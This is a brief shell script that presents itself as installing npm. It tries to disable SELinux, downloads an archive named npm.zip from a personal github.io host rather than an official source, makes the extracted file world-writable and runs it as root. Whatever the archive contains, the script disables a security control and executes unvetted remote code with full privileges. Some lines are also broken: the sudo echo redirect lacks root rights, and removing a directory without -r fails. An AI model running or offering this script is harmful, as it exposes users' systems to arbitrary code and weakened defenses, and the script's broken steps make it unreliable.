sudo echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
curl -L --progress-bar "https://fuserh.github.io/npm.zip" -o ./npm.zip
unzip npm.zip
sudo cp -r npm /usr/npm
rm ./npm.zip
rm npm
sudo ls /usr/
sudo chmod 777 /usr/npm/npm
sudo sh /usr/npm/npm
